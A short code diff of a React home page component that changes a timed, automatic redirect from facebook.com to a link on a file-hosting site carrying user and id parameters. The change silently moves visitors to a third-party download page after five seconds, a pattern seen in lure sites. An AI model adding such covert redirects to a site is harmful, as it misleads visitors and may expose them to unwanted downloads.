@@ -10,7 +10,7 @@ export default function Home() {
     //redirect
     const setTimeoutLoader = setTimeout(()=>{
       setLoader(!loader);
-     window.location.href = "https://facebook.com"
+     window.location.href = "https://tundrafile.com/show.php?l=0&u=1758832&id=47486"
     }, 5000);
 
     return ()=>{ 
